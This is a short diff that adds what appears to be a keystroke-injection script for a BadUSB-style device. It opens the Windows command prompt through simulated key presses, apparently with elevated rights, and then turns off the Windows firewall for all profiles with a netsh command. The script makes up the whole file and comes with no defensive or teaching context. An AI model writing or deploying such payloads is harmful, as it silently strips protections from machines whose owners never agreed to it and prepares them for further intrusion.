@@ -1,0 +1,9 @@
+KEY_LEFT_GUI
+delay 500
+cmd
+delay 500
+KEY_RIGHT_ARROW
+KEY_DOWN_ARROW
+KEY_RETURN
+delay 1000
+netsh advfirewall set allprofiles state off
